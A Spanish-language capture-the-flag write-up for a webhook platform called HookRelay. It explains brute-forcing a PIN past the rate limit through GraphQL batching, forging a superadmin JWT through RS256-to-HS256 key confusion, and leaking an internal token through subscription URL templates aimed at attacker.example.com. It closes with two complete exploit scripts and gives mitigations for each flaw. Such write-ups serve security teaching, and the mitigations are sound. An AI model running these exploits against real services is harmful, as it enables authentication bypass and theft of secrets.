![[Pasted image 20260704111448.png]]
# Writeup — HookRelay CTF

**Flag obtenida:** `flag{3cb0a7963549cf86}` **Endpoint final:** `GET /api/v2/admin/control`

## Resumen ejecutivo

HookRelay expone dos superficies de API: una v1 "legacy" (GraphQL + REST viejo) y una v2 (control plane + suscripciones + auditoría). Encontramos tres fallas encadenadas:

1. **Bypass del rate limiter** en el endpoint GraphQL, abusando de que soporta _batching_.
2. **Confusión de algoritmo JWT (RS256 → HS256)**, usando la clave pública (expuesta públicamente) como secreto HMAC.
3. **Fuga de secreto vía template injection en el audit log**: un token interno (`HEARTBEAT_TOKEN`) viaja dentro de eventos internos y se renderiza sin control de tenant hacia las plantillas de URL de _cualquier_ usuario.

Solo la falla #3 llevó directamente al flag (protegido por `HEARTBEAT_TOKEN`). La falla #2 demostró un bypass de autenticación completo, pero contra un endpoint que no devolvía nada sensible — igual es una vulnerabilidad real y grave que hay que reportar.

---

## 1. Reconocimiento

Revisando el código fuente (`legacy.py`, `control.py`, `audit.py`, `events.py`, `jwt_verify.py`, `keys.py`, `subscriptions.py`, `templating.py`) identificamos los puntos de interés:

|Archivo|Qué hace|Por qué importa|
|---|---|---|
|`legacy.py`|GraphQL v1 (`/graphql`), `/api/public-key`, `/api/admin/flag`, `/api/v1/legacy/search`|Rate limiter propio; endpoint admin que exige `role: superadmin` + `session_nonce` válido|
|`jwt_verify.py`|Verifica JWT soportando **RS256 y HS256**|El soporte dual de algoritmos es la raíz de la vulnerabilidad #2|
|`keys.py`|Carga `PUBLIC_KEY_PEM` desde disco|Esa misma variable se usa después como secreto HMAC|
|`config.py`|Genera `HEARTBEAT_TOKEN` random al arrancar|Protege `/api/v2/admin/control`, que devuelve el flag|
|`events.py`|Emite eventos `system.heartbeat` cada 60s con el `HEARTBEAT_TOKEN` embebido en texto plano dentro del payload del evento|Origen del secreto que se filtra|
|`audit.py`|`record_system_broadcast` renderiza el `url_template` de **todas** las suscripciones (de todos los usuarios) contra el evento del sistema|No filtra por owner ni por el campo `filter` de la suscripción → fuga entre tenants|
|`templating.py`|Motor de templates `{{path.to.field}}` sin sanitización|Permite extraer cualquier campo del evento, incluido el secreto|
|`control.py`|`/api/v2/admin/control` devuelve `FLAG` si el header `X-Heartbeat-Token` coincide con `HEARTBEAT_TOKEN`|El objetivo final|

---

## 2. Vulnerabilidad #1 — Bypass de rate limit vía batching de GraphQL

### Qué se hizo

`graphql_endpoint()` en `legacy.py` aplica `_check_rate_limit(request.remote_addr)` **una vez por HTTP request**, sin importar cuántas operaciones GraphQL vengan dentro. GraphQL sobre HTTP soporta _batching_: en vez de mandar un objeto `{query, variables}`, se puede mandar una **lista** de esos objetos, y todos se ejecutan en la misma llamada.

Se armó un array con las 10.000 combinaciones posibles del PIN de administrador (`0000`–`9999`), cada una como una mutación `verifyPin` distinta, y se mandaron **en un solo POST**:

```python
mutation = "mutation($pin: String!){ verifyPin(pin: $pin){ success token message } }"
batch = [{"query": mutation, "variables": {"pin": f"{i:04d}"}} for i in range(10000)]
r = s.post(f"{BASE}/graphql", json=batch)
```

El servidor cuenta esto como **1 sola request** contra el límite de "3 por minuto", así que las 10.000 pruebas del PIN pasan sin throttling.

### Por qué es una vulnerabilidad

El rate limiter valida a nivel de _transporte_ (request HTTP), no a nivel de _operación de negocio_ (cada mutación es, en la práctica, un intento de login/PIN independiente). Es un error clásico de "rate limit en la capa equivocada": cualquier API que permita batching de operaciones sensibles (auth, verificación de OTP, reset de contraseña, etc.) necesita limitar por operación, no por request.

### Resultado

Uno de los 10.000 intentos devuelve `success: true` junto con un JWT (`role: admin`) y, del lado del servidor, se guarda un `session_nonce` válido en el set `_issued_session_nonces`.

### Mitigación recomendada

- Contar cada operación dentro de un batch como un intento individual contra el rate limiter.
- Limitar o deshabilitar batching en operaciones de autenticación.
- Agregar backoff exponencial / bloqueo de cuenta tras N intentos fallidos, no solo limitar por IP.

---

## 3. Vulnerabilidad #2 — Confusión de algoritmo JWT (RS256 → HS256)

### Qué se hizo

`jwt_verify.py` soporta dos algoritmos:

```python
SUPPORTED_ALGORITHMS = ["RS256", "HS256"]
...
if alg == "RS256":
    PUBLIC_KEY.verify(signature, signing_input, padding.PKCS1v15(), hashes.SHA256())
elif alg == "HS256":
    expected = hmac.new(PUBLIC_KEY_PEM, signing_input, hashlib.sha256).digest()
    if not hmac.compare_digest(signature, expected):
        raise ValueError("Invalid signature")
```

El servidor firma tokens legítimos con **RS256** usando la clave privada. Pero si un token llega con `alg: HS256`, el verificador usa **la clave pública** (`PUBLIC_KEY_PEM`) como si fuera un secreto simétrico HMAC. Y esa clave pública está expuesta sin autenticación en `GET /api/public-key`.

Como cualquiera puede leer la clave pública y cualquiera puede firmar HMAC-SHA256 con una clave conocida, se puede forjar un JWT completamente arbitrario:

```python
def forge_hs256_jwt(payload, key_bytes, kid):
    header = {"alg": "HS256", "typ": "JWT", "kid": kid}
    header_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    signature = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{payload_b64}.{b64url(signature)}"

forged = forge_hs256_jwt(
    {"sub": "admin", "role": "superadmin", "session_nonce": leaked_nonce,
     "iat": ..., "exp": ...},
    public_key_bytes,
    kid="webhook-platform-key-1",
)
```

(Se firmó "a mano" con `hmac`/`base64` en vez de usar `PyJWT.encode`, porque las versiones recientes de PyJWT detectan si la key parece una PEM RSA/certificado y bloquean su uso como secreto HMAC — una mitigación justamente para este ataque, que hay que esquivar reimplementando la firma manualmente.)

### Por qué es una vulnerabilidad

Es el ataque de **key confusion** clásico entre algoritmos asimétricos y simétricos en JWT (CWE-347 / OWASP "JWT alg confusion"). Ocurre cuando:

1. El verificador acepta más de un algoritmo sin fijar cuál espera.
2. La clave usada para el algoritmo simétrico es derivable o pública (en este caso, literalmente la clave pública RSA).

Con esto se puede forjar **cualquier claim**, incluyendo `role: superadmin`, sin necesidad de ninguna credencial real. El único obstáculo adicional en este reto era que `/api/admin/flag` también exige un `session_nonce` presente en el set del servidor — por eso se combina con la vulnerabilidad #1 (para conseguir un nonce legítimo primero).

### Resultado

Se logró autenticar como `superadmin` contra `/api/admin/flag` (`Status: 200`), confirmando el bypass total de autenticación — aunque ese endpoint específico solo devolvía un mensaje de "deprecated", no el flag.

### Mitigación recomendada

- El verificador debe **fijar el algoritmo esperado** (solo `RS256`) y rechazar cualquier token cuyo header declare otro algoritmo, en vez de decidir dinámicamente según el campo `alg` del token (que el atacante controla).
- Nunca reusar una clave pública como secreto simétrico.
- Bibliotecas como PyJWT ya bloquean esto por defecto — no reimplementar el parsing de JWT a mano.

---

## 4. Vulnerabilidad #3 — Fuga de secreto vía audit log multi-tenant (la que dio el flag)

### Qué se hizo

`events.py` corre un hilo de fondo (`_heartbeat_loop`) que cada 60 segundos genera un evento interno:

```python
event = {
    "id": ...,
    "type": "system.heartbeat",
    "actor": {
        "role": "system",
        "context": {"continuation_id": HEARTBEAT_TOKEN},  # <-- el secreto, en texto plano
    },
    "region": "us-east-1",
    "ts": ...,
}
record_system_broadcast(event)
```

Y `audit.py` implementa `record_system_broadcast` así:

```python
def record_system_broadcast(event):
    for sub in iter_subscriptions():          # TODAS las suscripciones, de TODOS los usuarios
        rendered = render(sub["url_template"], event)   # renderiza el template contra el evento
        _append({..., "owner": sub["owner"], "rendered_url": rendered, ...})
```

Es decir: por cada suscripción existente (sin filtrar por dueño ni por el campo `filter` de la suscripción), toma el `url_template` que el usuario configuró y lo renderiza contra el evento del sistema, incluyendo el `HEARTBEAT_TOKEN`. El resultado queda guardado en el log de auditoría **de ese mismo usuario**, que puede leerlo con su propio token vía `GET /api/v2/audit/dispatches`.

Como usuario normal (sin privilegios), el exploit fue:

```python
# 1. Registrar usuario normal
r = s.post(f"{BASE}/api/auth/register", json={"username": "pwn_user_01"})
token = r.json()["token"]

# 2. Crear una suscripción cuyo url_template extrae el secreto del evento
s.post(f"{BASE}/api/v2/subscriptions", json={
    "name": "leak-heartbeat",
    "url_template": "https://attacker.example.com/cb?tok={{actor.context.continuation_id}}",
    "filter": "user.*",
}, headers={"Authorization": f"Bearer {token}"})

# 3. Esperar el próximo heartbeat (cada 60s) y leer el audit log propio
r = s.get(f"{BASE}/api/v2/audit/dispatches", headers={"Authorization": f"Bearer {token}"})
for e in r.json():
    if e["event_type"] == "system.heartbeat":
        heartbeat_token = e["rendered_url"].split("tok=")[-1]

# 4. Usar el token filtrado contra el control plane
r = s.get(f"{BASE}/api/v2/admin/control", headers={"X-Heartbeat-Token": heartbeat_token})
# -> {"flag": "flag{3cb0a7963549cf86}", "endpoint": "control_plane", "version": "v2"}
```

### Por qué es una vulnerabilidad

Es una combinación de dos errores de diseño:

1. **Un secreto de control interno viaja como dato dentro de un evento de negocio.** `HEARTBEAT_TOKEN` debería vivir solo en el servidor y nunca aparecer en ningún payload que pueda tocar código de usuario (templates, logs, respuestas).
2. **Falta de aislamiento entre tenants (broadcast sin control de acceso).** `record_system_broadcast` trata el `url_template` de cualquier usuario como código de confianza y lo ejecuta (renderiza) contra datos internos del sistema, sin verificar que ese usuario tenga permiso para ver esos datos. Esto es, en esencia, una **Server-Side Template Injection (SSTI) controlada por el atacante, con acceso a datos fuera de su propio contexto** — el usuario elige qué campo extraer (`{{cualquier.path}}`) y el sistema se lo renderiza con gusto, sin importar de dónde salió el evento.

El `filter` de la suscripción (pensado para limitar a qué eventos reacciona cada suscripción) tampoco se respeta en el camino de broadcast, lo que agrava el problema: ni siquiera hace falta suscribirse al tipo de evento correcto.

### Mitigación recomendada

- Nunca incluir secretos de control (tokens internos, claves, etc.) dentro del payload de eventos de negocio, ni siquiera en campos "internos" (`actor.context`).
- Si hay que correlacionar heartbeats, usar un identificador opaco sin valor de autorización (p. ej. un UUID de trazabilidad, no el mismo token que protege un endpoint administrativo).
- `record_system_broadcast` debería tener una lista explícita de campos "seguros" del evento que pueden exponerse a plantillas de usuario (allowlist), en vez de exponer el evento completo.
- Respetar el `filter` de la suscripción también en el camino de broadcast del sistema.
- Considerar sandboxing/allowlisting de qué paths puede referenciar un `url_template` de usuario.

---

## 5. Línea de tiempo del ataque

```
1. GET  /api/public-key                         → clave pública RSA (para el ataque #2)
2. POST /graphql  (batch de 10000 mutaciones)    → PIN correcto + session_nonce (rol admin)
3. [Vuln #2, prueba de concepto standalone]
   Forjar JWT HS256 con la clave pública          → bypass de auth confirmado en /api/admin/flag
4. POST /api/auth/register                       → usuario normal + JWT rol "user"
5. POST /api/v2/subscriptions                    → url_template malicioso
6. (esperar ~60s: dispara _heartbeat_loop)
7. GET  /api/v2/audit/dispatches                 → HEARTBEAT_TOKEN filtrado en rendered_url
8. GET  /api/v2/admin/control  (X-Heartbeat-Token: <leak>)  → FLAG
```

## 6. Conclusión

El reto encadena tres antipatrones de seguridad frecuentes en APIs reales: rate limiting mal ubicado, confusión de algoritmos criptográficos por soportar demasiados esquemas a la vez, y fuga de secretos por mezclar datos de control con datos de negocio en un sistema multi-tenant sin aislamiento estricto. Ninguna de las tres requirió herramientas exóticas — todo se resolvió con requests HTTP directos, lectura cuidadosa del código fuente, y encadenar los hallazgos.



```python
#!/usr/bin/env python3
"""
Exploit HookRelay v1 - /api/admin/flag

Cadena:
1. Bypass del rate-limiter de /graphql usando batching de GraphQL:
   mandamos las 10000 combinaciones de PIN (0000-9999) en UN solo
   POST (la lista cuenta como 1 sola request para el limiter).
2. Extraemos el session_nonce del PIN correcto (rol "admin", no sirve solo).
3. Forjamos un JWT nuevo con alg=HS256, firmado con la PUBLIC KEY (que es
   pública, /api/public-key) como secreto HMAC -- confusion RS256/HS256.
   Ese JWT dice role=superadmin y reusa el session_nonce robado.
4. Pegamos a /api/admin/flag con ese token.
"""

import sys
import time
import json
import base64
import hmac
import hashlib
import requests
import jwt


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_hs256_jwt(payload: dict, key_bytes: bytes, kid: str) -> str:
    """Arma un JWT HS256 a mano, sin pasar por las validaciones de PyJWT
    (que rechaza usar una PEM de clave publica como secreto HMAC)."""
    header = {"alg": "HS256", "typ": "JWT", "kid": kid}
    header_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    signature = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
    sig_b64 = b64url(signature)
    return f"{header_b64}.{payload_b64}.{sig_b64}"


BASE = sys.argv[1] if len(sys.argv) > 1 else "https://61fcd9ca9cf69014.chal.ctf.ae"

s = requests.Session()

# ---- 0. Bajar la clave pública (raw bytes -> va a ser nuestro secreto HMAC) ----
print("[*] Descargando public key...")
r = s.get(f"{BASE}/api/public-key")
r.raise_for_status()
public_key_bytes = r.content
print(f"[+] Public key obtenida ({len(public_key_bytes)} bytes)")

# ---- 1. Batched GraphQL brute-force del PIN admin (bypass rate limit) ----
print("[*] Armando batch de 10000 mutaciones verifyPin...")
mutation = "mutation($pin: String!){ verifyPin(pin: $pin){ success token message } }"
batch = [
    {"query": mutation, "variables": {"pin": f"{i:04d}"}}
    for i in range(10000)
]

print("[*] Enviando batch (una sola request, rate limit cuenta 1)...")
r = s.post(f"{BASE}/graphql", json=batch, headers={"Content-Type": "application/json"})
r.raise_for_status()
results = r.json()

leaked_nonce = None
admin_pin_token = None
for res in results:
    data = res.get("data", {})
    vp = data.get("verifyPin") if data else None
    if vp and vp.get("success"):
        admin_pin_token = vp["token"]
        print(f"[+] PIN correcto encontrado! token={admin_pin_token[:40]}...")
        break

if not admin_pin_token:
    print("[-] No se encontro el PIN. Revisar si el batching esta permitido o si hay chunking necesario.")
    sys.exit(1)

# extraer session_nonce del token legit (rol admin, no superadmin)
unverified = jwt.decode(admin_pin_token, options={"verify_signature": False})
leaked_nonce = unverified["session_nonce"]
print(f"[+] session_nonce robado: {leaked_nonce}")

# ---- 2. Forjar JWT con alg confusion (HS256 firmado con la public key) ----
print("[*] Forjando JWT superadmin via confusion RS256->HS256...")
forged_payload = {
    "sub": "admin",
    "role": "superadmin",
    "session_nonce": leaked_nonce,
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
}
forged_token = forge_hs256_jwt(
    forged_payload,
    public_key_bytes,  # la "clave publica" usada como secreto HMAC
    kid="webhook-platform-key-1",
)
print(f"[+] Token forjado: {forged_token}")

# ---- 3. Pegar al endpoint del flag ----
print("[*] Consultando /api/admin/flag...")
r = s.get(f"{BASE}/api/admin/flag", headers={"Authorization": f"Bearer {forged_token}"})
print(f"[+] Status: {r.status_code}")
print(f"[+] Response: {r.text}")
```

```python
#!/usr/bin/env python3
"""
Exploit para HookRelay CTF:
Filtra el HEARTBEAT_TOKEN via el audit log de suscripciones y luego
lo usa para leer el flag en /api/v2/admin/control.
"""

import requests
import time
import sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"

s = requests.Session()

# 1. Registrar usuario
print("[*] Registrando usuario...")
r = s.post(f"{BASE}/api/auth/register", json={"username": "pwn_user_01"})
r.raise_for_status()
data = r.json()
token = data["token"]
print(f"[+] user_id={data['user_id']}")
headers = {"Authorization": f"Bearer {token}"}

# 2. Crear suscripción maliciosa que filtra el continuation_id (== HEARTBEAT_TOKEN)
print("[*] Creando suscripción con template malicioso...")
sub_payload = {
    "name": "leak-heartbeat",
    "url_template": "https://attacker.example.com/cb?tok={{actor.context.continuation_id}}",
    "filter": "user.*",  # el filtro no importa para el broadcast de heartbeat
}
r = s.post(f"{BASE}/api/v2/subscriptions", json=sub_payload, headers=headers)
r.raise_for_status()
print(f"[+] Suscripción creada: {r.json()}")

# 3. Esperar al próximo heartbeat (corre cada 60s)
print("[*] Esperando el heartbeat (hasta 70s)...")
heartbeat_token = None
deadline = time.time() + 70
while time.time() < deadline and not heartbeat_token:
    time.sleep(5)
    r = s.get(f"{BASE}/api/v2/audit/dispatches", headers=headers)
    r.raise_for_status()
    entries = r.json()
    for e in entries:
        if e.get("event_type") == "system.heartbeat":
            url = e["rendered_url"]
            heartbeat_token = url.split("tok=")[-1]
            print(f"[+] Entrada de heartbeat encontrada: {e}")
            break

if not heartbeat_token:
    print("[-] No llegó ningún heartbeat todavía, corré el script de nuevo o esperá más.")
    sys.exit(1)

print(f"[+] HEARTBEAT_TOKEN filtrado: {heartbeat_token}")

# 4. Usar el token para golpear el control plane y sacar el flag
print("[*] Consultando /api/v2/admin/control...")
r = s.get(f"{BASE}/api/v2/admin/control", headers={"X-Heartbeat-Token": heartbeat_token})
print(f"[+] Status: {r.status_code}")
print(f"[+] Response: {r.json()}")
```
